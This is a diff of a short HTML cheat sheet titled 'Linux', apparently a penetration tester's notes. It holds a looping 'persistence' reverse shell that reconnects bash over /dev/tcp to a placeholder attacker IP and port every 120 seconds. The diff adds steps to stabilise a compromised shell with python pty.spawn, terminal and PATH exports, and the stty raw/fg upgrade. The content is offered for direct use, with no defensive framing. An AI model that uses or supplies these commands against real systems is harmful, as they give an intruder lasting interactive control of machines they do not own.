@@ -3,6 +3,20 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Linux</title>
-</head><body>Persistence Rev Shell<br/>
+</head><body><b>Persistence Rev Shell</b><br/>
 <br/>
-while :; do setsid bash -i &amp;&gt;/dev/tcp/&lt;ATTACKER IP&gt;/&lt;LPORT&gt; 0&gt;&amp;1; sleep 120; done &amp;&gt;/dev/null &amp;</body></html>
+while :; do setsid bash -i &amp;&gt;/dev/tcp/&lt;ATTACKER IP&gt;/&lt;LPORT&gt; 0&gt;&amp;1; sleep 120; done &amp;&gt;/dev/null &amp;<br/>
+<br/>
+<br/>
+<br/>
+<b>Stable Shell<br/>
+<br/>
+</b><br/>
+<br/>
+python -c 'import pty; pty.spawn("/bin/bash")'<br/>
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br/>
+export TERM=xterm-256color<br/>
+alias ll='clear ; ls -lsaht --color=auto'<br/>
+Keyboart Shortcut: Ctrl + Z (Backgroud Process.)<br/>
+stty raw -echo ; fg ; reset<br/>
+stty columns 200 rows 200</body></html>
